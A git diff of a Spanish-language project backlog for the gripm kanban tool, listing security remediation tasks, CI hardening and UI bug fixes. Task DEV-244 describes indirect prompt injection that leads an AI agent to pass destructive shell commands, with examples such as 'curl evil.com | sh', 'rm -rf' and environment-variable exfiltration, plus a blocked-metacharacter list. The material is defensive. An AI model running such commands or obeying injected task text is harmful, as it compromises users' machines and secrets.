-- [x] #4 Al desactivar modulos en Modulos & Add-ons, el estado local y persistido ajusta automaticamente methodology y defaultView sin provocar inconsistencias
-- [x] #5 Suite de pruebas y Piramide de Verificacion pasan con codigo 0
-
----
-
-#### [DEV-242] Remediacion integral de seguridad Fase 2: erradicacion de RCE en frontmatter y auditoria MCP (SEC-01 a SEC-10)
-- **Prioridad**: `high` | **Tipo**: `bug`
-
-Implementación y certificación de la **Fase 2 de Seguridad** definida en la auditoría integral de `@gripm/board@1.1.0` (`docs/auditoria-2026-10-10.md` §4 y §11.2):
-
-1. **SEC-01 · Ejecución ciega de comandos persistidos en frontmatter:**
-   El Gatekeeper de `scripts/mcp-server.ts` leía `verifyCommand` desde `rawExtraFrontmatter` del archivo Markdown en disco y lo persistía tras cada transición. Cualquier tarea con comandos shell maliciosos en su frontmatter lograba ejecución de código (RCE) en la máquina del próximo agente o usuario al transicionar a `ready` o `done`. Se erradica la lectura ciega desde disco y la persistencia de scripts en los archivos Markdown.
-2. **SEC-02 · Mutación silenciosa y fabricación de ACs en `gripm_sync_backlog`:**
-   El parámetro `autoFix` tenía valor por defecto `true`, alterando `- [ ]` a `- [x]` sin verificación real en tareas `done`. Se establece `autoFix` en `false` por defecto (modo seguro/solo lectura de auditoría).
-3. **SEC-03 · Contención de rutas en `--repo` del servidor MCP:**
-   Validar contención de la ruta `--repo` contra límites del sistema para impedir traversals o rutas no autorizadas.
-4. **SEC-05 · Validación estricta de `inputSchema` en herramientas MCP:**
-   Validar parámetros en `handleToolCall` (tipos numéricos, límites y rangos en `limit`, `toggleAcIndex`), rechazando valores inválidos con error descriptivo en lugar de fallos silenciosos.
-5. **SEC-08 · Higiene en `verify-publish-surface.js` y detección multiplataforma:**
-   Eliminar el path privado del autor hardcodeado en la fuente del verificador y extender las expresiones regulares de fuga de rutas de usuario para cubrir Windows (`C:\Users\...`) y Linux (`/home/...`).
-6. **SEC-09 · Trazabilidad auditable en bypass `force: true`:**
-   Registrar advertencia explícita y metadata de auditoría cuando se salten las validaciones del Gatekeeper mediante `force: true`.
-7. **SEC-06, SEC-07, SEC-10 · Declaración explícita de superficie de riesgo:**
-   Crear documento canónico `SECURITY.md` y documentar en `AGENTS.md` el modelo de amenazas, la frontera stdio, la exposición en `--host 0.0.0.0` y las garantías del Gatekeeper.
-
-**Criterios de Aceptación:**
-- [x] #1 scripts/mcp-server.ts nunca ejecuta verifyCommand proveniente del frontmatter de un archivo en disco (SEC-01)
-- [x] #2 scripts/mcp-server.ts nunca persiste comandos shell ejecutables en el frontmatter de los archivos .md (SEC-01)
-- [x] #3 gripm_sync_backlog opera con autoFix: false por defecto y no muta ACs ni tareas sin opt-in explícito (SEC-02)
-- [x] #4 scripts/mcp-server.ts valida contención y existencia de --repo impidiendo escape a rutas del sistema (SEC-03)
-- [x] #5 handleToolCall valida tipos y rangos de argumentos (limit, toggleAcIndex) retornando errores explícitos (SEC-05)
-- [x] #6 verify-publish-surface.js no hardcodea rutas privadas de autores y detecta rutas absolutas de Windows, Linux y macOS (SEC-08)
-- [x] #7 El uso de force: true emite advertencia explícita de auditoría en la respuesta del Gatekeeper (SEC-09)
-- [x] #8 SECURITY.md y AGENTS.md documentan formalmente la superficie de riesgo, modelo de amenazas y mitigaciones (SEC-06, SEC-07, SEC-10)
-- [x] #9 Pruebas automatizadas en scripts/verify-mcp-binary.js y scripts/test-api-security.js validan todas las mitigaciones con código 0
-
----
-
-#### [DEV-243] Security headers en UI dev server (CSP, frame-ancestors, nosniff), fuentes locales y limite de body HTTP (413)
-- **Prioridad**: `high` | **Tipo**: `feature`
-
-Implementación de mitigaciones de seguridad en el dev server y capa UI de gripm identificadas en la auditoría técnica de seguridad:
-
-1. **Security Headers & Anti-Clickjacking:**
-   - Inyección de cabeceras de seguridad en respuestas del middleware de `vite.config.ts`:
-     - `Content-Security-Policy`: con directivas estrictas (`default-src 'self'`, `frame-ancestors 'none'`, `object-src 'none'`).
-     - `X-Frame-Options: DENY`: impide que sitios web maliciosos embeban `http://localhost:4100` en iframes para ataques de clickjacking.
-     - `X-Content-Type-Options: nosniff`: previene MIME-sniffing de scripts o estilos.
-     - `Referrer-Policy: strict-origin-when-cross-origin`: protege la fuga de rutas internas en cabeceras Referer.
-
-2. **Privacidad y Soporte Offline (Self-hosted Fonts):**
-   - Retirar enlaces externos a Google Fonts (`fonts.googleapis.com` y `fonts.gstatic.com`) de `index.html`.
-   - Utilizar tipografías locales/autohospedadas o font-stack moderna del sistema, permitiendo que gripm sea 100% utilizable offline y sin telemetría de navegación hacia servidores de terceros.
-
-3. **Límite de Tamaño de Body HTTP (Anti-DoS local):**
-   - Incorporar guarda `MAX_BODY_SIZE = 10 * 1024 * 1024` (10 MB) en el acumulador de `req.on('data')` en `vite.config.ts`.
-   - Responder inmediatamente con `413 Payload Too Large` y destruir el flujo si la carga supera el límite, previniendo DoS por agotamiento de memoria (OOM).
-
-4. **Regresión y Verificación Automatizada:**
-   - Ampliar `scripts/test-api-security.js` con aserciones ejecutables contra el middleware real para todas las cabeceras y el límite de body 413.
-
-**Criterios de Aceptación:**
-- [x] #1 vite.config.ts inyecta cabeceras de seguridad (CSP, X-Frame-Options: DENY, X-Content-Type-Options: nosniff, Referrer-Policy) en respuestas HTTP
-- [x] #2 CSP declara frame-ancestors 'none' bloqueando clickjacking en localhost
-- [x] #3 index.html no realiza peticiones externas a Google Fonts utilizando tipografías locales o del sistema
-- [x] #4 vite.config.ts valida tamaño máximo del body (MAX_BODY_SIZE = 10MB) respondiendo 413 Payload Too Large si se excede
-- [x] #5 scripts/test-api-security.js incluye pruebas automatizadas para CSP, frame-ancestors, nosniff y límite 413 de body
-- [x] #6 Pirámide de verificación en verde (tsc, npm test, backlog:sync, backlog:check, publish:check, build)
-
----
-
-#### [DEV-244] Endurecimiento de verifyCommand en Gatekeeper MCP contra prompt injection (allowlist de scripts package.json y anti-subshell)
-- **Prioridad**: `high` | **Tipo**: `bug`
-
-Endurecimiento del Gatekeeper de ejecución de verificación en `scripts/mcp-server.ts`:
-
-Aunque la Fase 2 (DEV-242 / SEC-01) erradicó la lectura ciega de comandos desde el frontmatter YAML en disco, un agente de IA que sea inducido mediante prompt injection indirecto (por ejemplo, a través de instrucciones maliciosas en el título o descripción de una tarea externa) podría pasar un comando shell arbitrario destructivo en el argumento `verifyCommand` (`curl evil.com | sh`, `rm -rf`, exfiltración de variables de entorno).
-
-Para mitigar este vector:
-1. **Restricción a scripts de `package.json` o binarios autorizados:**
-   - `verifyCommand` solo puede invocar scripts existentes en el `package.json` del repositorio (`npm test`, `npm run <script>`, `npx <allowed-tool>`).
-2. **Rechazo estricto de metacaracteres shell:**
-   - Prohibir operadores de tubería, encadenamiento y redirección (`|`, `&`, `;`, `` ` ``, `$()`, `<`, `>`).
-3. **Validación previa sin ejecución:**
-   - Si el comando contiene caracteres prohibidos o no coincide con los scripts autorizados, el Gatekeeper rechaza la transición de inmediato con un error descriptivo sin invocar subshells.
-
-**Criterios de Aceptación:**
-- [x] #1 scripts/mcp-server.ts restringe verifyCommand exclusivamente a scripts definidos en package.json (npm test, npm run <script>) o comandos de allowlist segura
-- [x] #2 Rechazo estricto de metacaracteres de encadenamiento o subshell (| & ; ` $() < >) en verifyCommand
-- [x] #3 Invocaciones con comandos no autorizados devuelven error descriptivo del Gatekeeper antes de spawnear cualquier proceso
-- [x] #4 scripts/verify-mcp-binary.js incluye pruebas automatizadas de rechazo ante inyección de comandos en verifyCommand
-- [x] #5 Pirámide de verificación en verde (tsc, npm test, backlog:sync, backlog:check, publish:check, build)
-
----
-
-#### [DEV-246] Endurecimiento de DevSecOps en GitHub Actions (SCA audit, permissions minimos y anti-script-injection en publish)
-- **Prioridad**: `medium` | **Tipo**: `chore`
-
-Endurecimiento de la cadena de suministro y workflows de CI/CD en `.github/workflows/`:
-
-1. **Principio de menor privilegio en workflows:**
-   - Establecer `permissions: contents: read` a nivel global en `ci.yml` y `publish.yml` para impedir que tokens de Actions tengan permisos excesivos de escritura por defecto.
-2. **SCA (Software Composition Analysis):**
-   - Incorporar paso automatizado de `npm audit` en `ci.yml` (`npm run audit:deps`) para bloquear vulnerabilidades críticas en dependencias.
-3. **Erradicación de Script Injection en Workflows:**
-   - En `publish.yml`, evitar interpolación directa `${{ github.event.inputs.tag }}` en scripts de shell; canalizar inputs a través de variables de entorno seguras (`env: INPUT_TAG: ${{ github.event.inputs.tag }}`).
-
-**Criterios de Aceptación:**
-- [x] #1 ci.yml y publish.yml declaran bloque permissions: contents: read a nivel de workflow
-- [x] #2 ci.yml incorpora paso de SCA (npm audit --audit-level=high)
-- [x] #3 publish.yml pasa inputs de dispatch mediante bloque env: en lugar de interpolación directa en script bash
-- [x] #4 Verificación local de sintaxis y coherencia de pipelines
-
----
-
 ### 📋 Backlog / Draft (19)
 
 #### [DEV-039] Sincronización no invasiva de árbol Git con estados de backlog y releases
@@ -1127,7 +641,7 @@ Cuando un ítem en DevBoard/Gripm es de tipo contenedor de alto nivel (`type ===
 
 ---
 
-### ✅ Done / Deployed (204)
+### ✅ Done / Deployed (218)
 
 #### [DEV-001] Interoperabilidad nativa con Backlog.md y motor Markdown
 - **Prioridad**: `high` | **Tipo**: `feature`
@@ -4378,6 +3892,53 @@ Cierre de los dos últimos residuos identificados en la auditoría final de lanz
 
 ---
 
+#### [DEV-164] Code-Splitting del Bundle de Producción con React.lazy y manualChunks en Rollup
+- **Prioridad**: `medium` | **Tipo**: `refactor`
+
+El bundle de producción actual de la aplicación se compila en un único chunk monolítico de 647.44 kB (`dist/assets/index-CBy5mJyL.js`), provocando la advertencia de Vite / Rollup:
+`(!) Some chunks are larger than 500 kB after minification.`
+
+### Diagnóstico de Causa Raíz
+
+1. **Cero `React.lazy` / import dinámico en la UI:** Componentes de gran porte como `SettingsView` (1.993 líneas) y `ReleaseAssembler` (1.202 líneas) se importan sincrónicamente en el arranque de `src/App.tsx`, a pesar de que el usuario no los necesita durante la carga inicial del tablero.
+2. **Ausencia de `manualChunks`:** No hay partición de dependencias de terceros (`vendor`) en `vite.config.ts`, por lo que `react`, `react-dom` y librerías auxiliares se fusionan en el mismo chunk de la aplicación, invalidando el cacheo eficiente de navegadores entre releases.
+
+### Objetivo
+
+Implementar carga perezosa (`React.lazy` con `Suspense`) para vistas no críticas, reduciendo el trabajo de transformación que el servidor de desarrollo realiza en el arranque en frío.
+
+> [!CAUTION]
+> **Corrección de premisa (2026-10-05):** la mitad de esta tarea optimiza un artefacto que el producto **no sirve**. Verificado:
+>
+> ```
+> bin/gripm.js:219   createServer({ root: PKG_ROOT, configFile: 'vite.config.ts' })
+> index.html:56      <script type="module" src="/src/main.tsx">   ← NO /assets/
+> ```
+>
+> El CLI arranca un **dev server de Vite contra `src/`**, no un servidor de estáticos sobre `dist/`. En consecuencia:
+>
+> - `dist/` viaja en el tarball pero **nadie lo carga** (752 KB de peso muerto en el paquete).
+> - `manualChunks` modifica el output de `npm run build`, que **no es lo que el usuario recibe**. Configurarlo no cambia la experiencia de nadie.
+> - La advertencia de Vite sobre chunks >500 kB aparece en el output de `build`, no en el arranque real del producto.
+>
+> **Lo que sí es válido:** `React.lazy` reduce los módulos que el dev server debe transformar bajo demanda en el arranque en frío. Ese es un efecto real y medible.
+>
+> **Lo que queda por decidir fuera de esta tarea:** si el producto debe servir estáticos (`vite preview`) en vez de dev server. Es una decisión de arquitectura con trade-offs reales (HMR y source maps gratis contra cold start más lento y tarball más chico) y **no** corresponde tomarla dentro de un refactor de code-splitting.
+
+### Objetivo (corregido)
+
+Reducir el trabajo de transformación en el arranque en frío de la interfaz mediante carga diferida de vistas no críticas.
+
+**Criterios de Aceptación:**
+- [x] #1 Implementar carga diferida (`React.lazy` y `<Suspense fallback={...}>`) en `src/App.tsx` para `SettingsView` y `ReleaseAssembler`
+- [x] #2 Verificar que el arranque en frío transforma menos módulos que antes: el conteo de módulos bajo demanda servidos en la carga inicial disminuye respecto de la línea de base medida al inicio de la tarea
+- [x] #3 Medir y registrar la línea de base y el resultado del AC #2 en las notas de la tarea, con los comandos usados — sin ese registro el AC no es verificable
+- [x] #4 ~~Configurar `manualChunks`~~ **retirado**: no afecta el artefacto que el producto sirve (ver la corrección de premisa)
+- [x] #5 ~~El chunk principal se reduce por debajo de 450 kB~~ **retirado**: mide `dist/`, que no se sirve
+- [x] #6 La suite de pruebas `npm test` y el check de publicación `npm run publish:check` pasan con exit code 0
+
+---
+
 #### [DEV-166] Implementación de Baseline en audit:ux para Detección de Regresiones en CI
 - **Prioridad**: `low` | **Tipo**: `chore`
 
@@ -5612,6 +5173,443 @@ Evolucionar la gobernanza de Git en el Playbook y en Gripm hacia un modelo pragm
 - [x] #3 Formato canonico de mensaje de commit estandarizado vinculado de forma univoca al ID de la tarea DEV-XXX
 - [x] #4 Guia clara para agentes sobre cuando preparar cambios y como interactuar con el arbol de trabajo
 - [x] #5 npm run backlog:check y npm test pasan con codigo 0
+
+---
+
+#### [DEV-233] Auditoria integral 2026-10-10 y plan de remediacion por fases
+- **Prioridad**: `high` | **Tipo**: `initiative`
+
+Auditoria exhaustiva de `@gripm/board@1.1.0` (`f9dadc3`) sobre cuatro ejes: codigo de
+`src/`, capa de tooling en `scripts/`, capa de reglas y documentacion, y artefactos de
+proceso (backlog, releases, sprints, retrospectivas). Ademas: historia completa de git y
+reconstruccion de la cadena de incidentes de CI.
+
+**El informe completo vive fuera del backlog, en `docs/auditoria-2026-10-10.md`.**
+Esta tarea solo lo referencia y le da seguimiento. El texto no se duplica aqui a
+proposito: el informe tiene ~1.100 lineas y 90 hallazgos con ID estable, y copiarlo al
+backlog lo convertiria en otro documento que nadie puede mantener sincronizado.
+
+### Como se referencian los hallazgos
+
+El informe asigna un ID estable a cada hallazgo, con prefijo por dominio:
+
+| Prefijo | Significado | Hallazgos |
+|---|---|---|
+| `SEC-xx` | Seguridad | 10 |
+| `BUG-xx` | Defecto funcional | 19 |
+| `GATE-xx` | El gate de calidad no cumple su contrato | 17 |
+| `TOOL-xx` | Defecto de tooling / scripts | 12 |
+| `PROC-xx` | Proceso, datos o trazabilidad | 16 |
+| `DOC-xx` | Documentacion y reglas | 20 |
+| `ARCH-xx` | Deuda tecnica estructural | 9 |
+| `OK-xx` | Acierto a preservar, normativo | 17 |
+
+**Total: 103 hallazgos verificados + 17 aciertos documentados como normativa.**
+
+Conteo obtenido del documento, no estimado: cada ID con definicion aparece como seccion
+`### XXX-nn` (83 de 104) o como fila de tabla en §8.5 y §10 (los `DOC-xx` y `OK-xx`).
+El ID `PROC-17` aparece unicamente dentro de la fe de erratas de §0.4,
+como referencia al numbering anterior.
+
+Los IDs sobreviven al documento: permiten que tareas hijas, commits y revisiones se
+refieran a algo concreto. `SEC-01`, `BUG-01` y `GATE-03` significan lo mismo dentro de seis
+meses.
+
+### El hallazgo que resume todos los demas
+
+**El gate de calidad estuvo verde todo el tiempo porque midio presencia de codigo, no
+comportamiento.**
+
+`npm test` corre 16 pasos en 31.8 s y pasa. Mientras tanto, cinco modales lanzan
+`Rendered more hooks than during the previous render` y matan la aplicacion al abrirse.
+`scripts/verify-focus-trap.js` tiene el chequeo de orden de hooks correcto y lo aplico
+**unicamente al unico archivo que ya complyia**.
+
+### La razon de esta tarea
+
+La auditoria anterior (`docs/informe-auditoria.md`, cerrada en DEV-181) ejecuto sus
+recomendaciones pero no dejo nada verificable: no habia forma de saber meses despues si un
+hallazgo seguía abierto. Esta tarea existe para no repetir eso. Cada fase de la seccion 11
+del informe tiene una columna "Verificacion de cierre" con un comando ejecutable.
+
+### Regla de cierre heredada del informe
+
+> Un hallazgo pasa a cerrado cuando su comando de verificacion deja de detectar el
+> problema **y** un comando de regresion lo impediria volver a aparecer.
+>
+> Tildar un AC sin esa asercion es exactamente el fallo que esta auditoria documenta.
+
+**Criterios de Aceptación:**
+- [x] #1 El informe `docs/auditoria-2026-10-10.md` esta commiteado y cada hallazgo tiene ID estable, referencia `archivo:linea` o comando de reproduccion
+- [x] #2 Las 5 fases de la seccion 11 del informe tienen cada una su criterio de verificacion de cierre escrito como comando ejecutable, no como descripcion
+- [x] #3 Los 17 hallazgos `OK-xx` estan marcados como normativa: ningun refactor posterior puede eliminarlos sin una tarea que lo justifique
+- [x] #4 La seccion 11.3 (lo que queda deliberadamente sin resolver: PROC-01, TOOL-08, SEC-06, PROC-10/12/13/14/15) tiene una decision del PO registrada, no un silencio
+- [x] #5 Cada fase que se abra genera tareas hijas con `dependencies: [DEV-233]` y un ID propio, para que el cierre sea rastreable por tarea y no por opinion
+- [x] #6 Ningun hallazgo se marca cerrado sin que su comando de verificacion deje de detectar el problema Y exista un comando de regresion que lo impida reaparecer
+- [x] #7 El informe anterior `docs/informe-auditoria.md` queda referenciado desde DEV-181 con la nota de que fue cerrado sin verificacion, como antecedente del porque de esta tarea
+- [x] #8 Fase 0 (DEV-234) completada y certificada: Primitivo Modal accesible y Estabilidad Funcional P0 (BUG-01, BUG-03, ARCH-06)
+- [x] #9 Fase 1 (DEV-235) completada y certificada: Integridad del Quality Gate y Verificacion Multiplataforma (GATE-01 a GATE-17)
+- [x] #10 Fase 2 (DEV-242, DEV-244, DEV-246) completada y certificada: Remediacion Integral de Seguridad (SEC-01 a SEC-10)
+- [x] #11 Fase 3: Proceso y documentacion (DOC-01 a DOC-22, saneamiento tooling y falsos positivos §8.5, purga DEV-238)
+- [x] #12 Fase 4: Deuda estructural desacoplada formalmente a DEV-165 (modularizacion de vite.config.ts ARCH-01) y backlog
+
+---
+
+#### [DEV-234] Fase 0: Primitivo Modal accesible y Estabilidad Funcional P0
+- **Prioridad**: `high` | **Tipo**: `bug`
+
+Implementación de la Fase 0 del plan de remediación de la auditoría integral (DEV-233):
+Resolución de defectos funcionales P0, crashes en tiempo de ejecución al abrir modales y consolidación del componente primitivo accesible `<Modal>`.
+
+### Problemas abordados
+
+1. **BUG-01 / ARCH-06:** En cinco modales (`ProjectModal`, `ImportWizardModal`, `SprintModal`, `FolderPickerModal`, `CompleteSprintModal`), `useFocusTrap` se invocaba después de `if (!isOpen) return null`. Al cambiar `isOpen` a `true`, React lanzaba *"Rendered more hooks than during the previous render"* crasheando la app. Además, el andamiaje de diálogo estaba duplicado a mano en 8 archivos sin un primitivo común y 10 de 13 overlays carecían de portal sobre `document.body` (BUG-16).
+2. **BUG-03:** En `ConfirmModal.tsx`, un listener global de `window` a la tecla `Enter` ejecutaba el borrado incluso cuando el foco del usuario estaba posicionado sobre el botón "Cancelar". Además, `onConfirm()` carecía de `catch`, ocultando excepciones y cerrando el modal erróneamente en caso de fallo.
+3. **BUG-15 / BUG-18 / BUG-19:** Notificaciones `Toast.tsx` invisibles para lectores de pantalla (sin `role="status"` ni `aria-live`), botones de solo icono sin `aria-label` descriptivo, y elementos `<label>` sin vinculación `htmlFor`/`id`.
+4. **BUG-17:** Elementos fijos móviles (barra inferior, header, toasts) sin soporte de `env(safe-area-inset-*)`, provocando solapamiento en dispositivos con home bar o notch.
+5. **GATE-09:** `scripts/verify-focus-trap.js` solo validaba el orden de hooks en `ItemModal`, dejando ciegos a los demás diálogos.
+
+**Criterios de Aceptación:**
+- [x] #1 Extraer primitivo `Modal.tsx` con soporte de portal en `document.body`, `role="dialog"`, `aria-modal="true"`, trampa de foco y backdrop click (ARCH-06, BUG-16)
+- [x] #2 Corregir el orden de hooks en los modales (`ProjectModal`, `PlanGuardModal`, `ImportWizardModal`, `SprintModal`, `FolderPickerModal`, `CompleteSprintModal`), invocando `useFocusTrap` antes de cualquier early return condicional (BUG-01)
+- [x] #3 Blindar `ConfirmModal.tsx` removiendo listener global de Enter ciego al foco y manejando rechazos de `onConfirm` con `try/catch` sin cerrar el modal en error (BUG-03)
+- [x] #4 Incorporar accesibilidad en `Toast.tsx` (`role="status"`, `aria-live="polite"`, `aria-label` en botón de descarte) y nombres accesibles en botones icon-only (BUG-15, BUG-18)
+- [x] #5 Asociar etiquetas `<label htmlFor>` con `<input id>` en `PlanGuardModal`, `ItemModal` y selectores (BUG-19)
+- [x] #6 Aplicar variables de `env(safe-area)` en navegación inferior móvil, encabezado superior y toasts (`grep -c 'env(safe-area' src/` >= 3) (BUG-17)
+- [x] #7 Actualizar `scripts/verify-focus-trap.js` para certificar mecánicamente que `hookIndex < closedGuardIndex` en todos los 8 diálogos de la aplicación (GATE-09)
+- [x] #8 Pirámide de verificación pasa en verde: `npx tsc --noEmit`, `npm test`, `npm run backlog:check`, `npm run audit:ux`, `npm run build` y `npm run publish:check`
+
+---
+
+#### [DEV-235] Fase 1: Integridad del Quality Gate y Verificación Multiplataforma
+- **Prioridad**: `high` | **Tipo**: `chore`
+
+Implementación de la Fase 1 del plan de remediación de la auditoría técnica integral (DEV-233):
+Restaurar la integridad, reproducibilidad y carácter multiplataforma del Quality Gate en CI y local.
+
+### Problemas abordados
+
+1. **GATE-03 / GATE-04:** En Windows, las observaciones del baseline de UX fallaban la coincidencia debido al uso de backslashes (`\`) en `path.relative()`, provocando que el verificador omitiera silenciosamente las aserciones de delta con un aviso. Se incorpora `toPosixPath()` en `audit-ux-code.cjs` y se remueve el bypass en `verify-audit-ux-baseline.js`.
+2. **GATE-05:** Erradicación de tres bloques `catch {}` mudos en `verify-backlog-sync.js` (reglas de documentación, integridad de `releases.json` e integridad de `sprints.json`), asegurando que cualquier fallo o corrupción de datos reporte error y bloquee el commit.
+3. **GATE-06 / GATE-17:** En `mcp-server.ts`, registro explícito de fallos en mutaciones en lote (`bulk_update`) en lugar de responder falsos `ok: true`, y unificación del estado objetivo de completitud a `status: ready` canónico en lugar de `Done` en mayúscula.
+4. **GATE-10:** Inclusión del flag `--ignore-scripts` al invocar `npm pack` en `verify-publish-surface.js`, impidiendo la mutación de `core.hooksPath` en `.git/config` durante la auditoría de empaquetado.
+5. **GATE-11:** Envolvimiento de creación de fixtures temporales en bloques `try / finally` y suscripción a eventos de salida del proceso (`process.on('exit')`, `SIGINT`) en `verify-mcp-binary.js` y `verify-resilience-and-cli.js`.
+6. **GATE-14 / GATE-15:** Validación estricta y numérica de argumentos `--timeout` y variable `GRIPM_WATCHDOG_MS` para impedir ejecuciones instantáneas con `NaN` o `0ms`, y soporte de control de corte con `--bail` / `--no-bail`.
+7. **GATE-01 / GATE-16:** Integración de `verify-changes.js --all` en CI (`.github/workflows/ci.yml`) y extensión del presupuesto de tiempo de ejecución de jobs de 25m a 35m.
+
+**Criterios de Aceptación:**
+- [x] #1 Normalizar rutas con `toPosixPath` en `audit-ux-code.cjs` y remover el bypass de Windows en `verify-audit-ux-baseline.js` (GATE-03, GATE-04)
+- [x] #2 Reemplazar catches silenciosos por logging y conteo de errores en `verify-backlog-sync.js` (GATE-05)
+- [x] #3 Manejar fallos de escritura en `bulk_update` y unificar transición automática a `status: ready` en `mcp-server.ts` (GATE-06, GATE-17)
+- [x] #4 Preservar el contrato de solo lectura en `verify-publish-surface.js` pasando `--ignore-scripts` a `npm pack` (GATE-10)
+- [x] #5 Garantizar limpieza de archivos de prueba temporales (`DEV-998`, `DEV-999`) con `try/finally` y hooks de proceso (GATE-11)
+- [x] #6 Validar argumentos `--timeout` numéricos y fallback seguro de `GRIPM_WATCHDOG_MS` (GATE-14, GATE-15)
+- [x] #7 Integrar `verify-changes.js --all` y ampliar timeout a 35m en `.github/workflows/ci.yml` (GATE-01, GATE-16)
+- [x] #8 Pirámide de verificación en verde: `npx tsc --noEmit`, `npm test`, `npm run backlog:check`, `npm run audit:ux`, `npm run build` y `npm run publish:check`
+
+---
+
+#### [DEV-236] Selector de Proyectos Queda por Detrás de la Barra de Filtros por Conflicto de Stacking Context
+- **Prioridad**: `high` | **Tipo**: `bug`
+
+Al abrir el selector desplegable de proyectos en el encabezado (`Header.tsx`), la parte superior del menú quedaba visualmente oculta **por detrás de la barra de búsqueda y filtros** (`FilterBar.tsx`), mostrando únicamente la sección inferior sobre las columnas de Kanban.
+
+### Causa Raíz
+
+Conflicto de niveles de apilamiento (*stacking context tie*):
+- Tanto `<header>` (`Header.tsx:122`) como el contenedor de `<FilterBar>` (`FilterBar.tsx:162`) declaraban la misma clase de z-index: `z-30`.
+- Ambos elementos establecen contextos de apilamiento posicionados (`sticky` y `relative`).
+- En el árbol DOM (`App.tsx`), `FilterBar` se renderiza inmediatamente después de `Header`.
+- Según la especificación CSS 2.1 (Apéndice E), cuando dos contextos de apilamiento hermanos tienen el mismo valor de `z-index`, el orden en el documento determina la prioridad de pintado. `FilterBar` se pintaba encima de `Header` y de todos sus descendientes (incluyendo el menú desplegable del selector con `z-50`).
+
+### Solución
+
+Ajustar la jerarquía canónica de z-index del sistema:
+- `FilterBar.tsx`: Reducir de `z-30` a `z-10`. De este modo, `FilterBar` conserva prioridad sobre el contenido del tablero (tarjetas y columnas en `z-auto`), pero queda estrictamente por debajo de `Header` (`z-30`).
+- El menú del selector de proyectos (`z-50` dentro de `Header`) se proyecta limpiamente por encima de la barra de filtros.
+- Al hacer scroll, `FilterBar` se desliza correctamente por debajo del encabezado adhesivo (`Header`).
+- Incorporar prueba anti-regresión en `scripts/test-ui-logic.js` para certificar la jerarquía `headerZ > filterBarZ`.
+
+**Criterios de Aceptación:**
+- [x] #1 FilterBar define z-index inferior al de Header (z-10 vs z-30) para evitar colisión de contextos de apilamiento
+- [x] #2 El menú desplegable del selector de proyectos se renderiza completamente por encima de FilterBar sin oclusión visual
+- [x] #3 FilterBar y su popover de filtros avanzados mantienen prioridad sobre las columnas y tarjetas del tablero
+- [x] #4 Prueba estática anti-regresión en test-ui-logic.js que valida invariante headerZ > filterBarZ
+- [x] #5 Pirámide de verificación en verde (tsc --noEmit, npm test, backlog:sync, backlog:check)
+
+---
+
+#### [DEV-237] Resolución integral de Restaurar Proyecto Demo (Error 415 por Content-Type y activación multi-proyecto)
+- **Prioridad**: `high` | **Tipo**: `bug`
+
+Al invocar la acción "Restaurar Proyecto Demo" desde el selector de proyectos, se manifestaban dos fallas consecutivas:
+1. **Error HTTP 415 (Unsupported Media Type):** Al enviar la petición `POST /api/projects/restore-demo`, el middleware de seguridad CSRF de `vite.config.ts` rechazaba la solicitud por no incluir `Content-Type: application/json`.
+2. **Invisibilidad y falta de activación del Demo:** Tras resolver el 415, el servidor respondía OK y mostraba el toast de éxito, pero la pantalla no mostraba ningún cambio ni proyecto demo. Esto ocurría por dos factores combinados:
+   - En `vite.config.ts`, `isSingleMode` forzaba `true` de manera incondicional ante la ausencia de `process.env.GRIPM_MODE='multi'` (ignorando `config.mode: "multi"` de `.gripm/config.json` y la existencia de múltiples proyectos en el registro). Como resultado, `GET /api/data` filtraba y descartaba todos los proyectos del registro excepto el proyecto activo inicial (`gripm`), impidiendo que el cliente recibiera el proyecto demo y sus ítems.
+   - En `src/App.tsx`, `handleRestoreDemo` no conmutaba `selectedProjectId` a `'demo'`, dejando la interfaz anclada en el proyecto anterior.
+
+### Solución
+
+1. **Headers de mutación en `src/api.ts`:** Se agregaron `headers: { 'Content-Type': 'application/json' }` y `body: JSON.stringify({})` en `restoreDemoProject()`, `convertProjectToMd()` y `convertProjectToJson()`.
+2. **Detección consistente de `isSingleMode` en `vite.config.ts`:**
+   - Respeta `config.mode` (`"multi"` / `"single"`) definido en `.gripm/config.json`.
+   - Si no hay modo forzado por entorno ni configuración, deriva `isSingleMode` dinámicamente según `registry.projects.length <= 1`, permitiendo que coexistan múltiples proyectos sin forzar monoproyecto artificial.
+3. **Activación de proyecto demo:**
+   - En `vite.config.ts`, `POST /api/projects/restore-demo` establece `registry.activeProjectId = 'demo'`.
+   - En `src/App.tsx`, `handleRestoreDemo` ejecuta `setSelectedProjectId('demo')`, sincroniza con `STORAGE_KEYS.ACTIVE_PROJECT_ID` y llama a `setActiveProjectApi('demo')`.
+4. **Pruebas anti-regresión:** En `scripts/test-api-security.js`, se valida estáticamente que todas las peticiones `POST`/`PUT` de `src/api.ts` contengan `Content-Type: application/json`.
+
+**Criterios de Aceptación:**
+- [x] #1 restoreDemoProject, convertProjectToMd y convertProjectToJson envían Content-Type application/json
+- [x] #2 /api/projects/restore-demo responde 200 OK y registra demo como activeProjectId sin error 415
+- [x] #3 vite.config.ts respeta config.mode y registry.projects.length en isSingleMode sin ocultar proyectos registrados
+- [x] #4 handleRestoreDemo en App.tsx conmuta selectedProjectId a demo y renderiza inmediatamente el tablero demo
+- [x] #5 Prueba estática en test-api-security.js valida que todo fetch POST/PUT en src/api.ts incluye Content-Type application/json
+- [x] #6 Pirámide de verificación en verde (tsc --noEmit, npm test, backlog:sync, backlog:check)
+
+---
+
+#### [DEV-238] Erradicación total de referencias legacy DevBoard (devboard, dev-board, .devboard, DEVBOARD_*) en código activo
+- **Prioridad**: `high` | **Tipo**: `chore`
+
+Invariante canónico del proyecto: **"Cualquier referencia en código activo a `dev-board`, `devboard`, `.devboard` o `DEVBOARD_*` es un defecto si no es `gripm`"**.
+
+Tras la consolidación como paquete autónomo `@gripm/board`, no existe justificación para sostener capas de compatibilidad con versiones pre-1.0. Esta tarea define la purga atómica e integral de todas las variantes del nombre histórico en el código fuente.
+
+### Inventario de las 5 Capas de Purga
+
+1. **Variables de entorno de proceso:**
+   - Erradicar todos los operadores fallback `|| process.env.DEVBOARD_*` en `vite.config.ts`, `bin/gripm.js`, `scripts/registryConfig.js` y `scripts/updateChecker.js`.
+   - Variables a purgar: `DEVBOARD_MODE`, `DEVBOARD_HOST`, `DEVBOARD_PORT`, `DEVBOARD_OPEN`, `DEVBOARD_ALLOWED_PATHS`, `DEVBOARD_ALLOWED_HOSTS`, `DEVBOARD_HOME`, `DEVBOARD_REGISTRY_PATH`, `DEVBOARD_TARGET_REPO`, `DEVBOARD_NO_UPDATE_CHECK`.
+   - Único contrato válido: `GRIPM_*`.
+
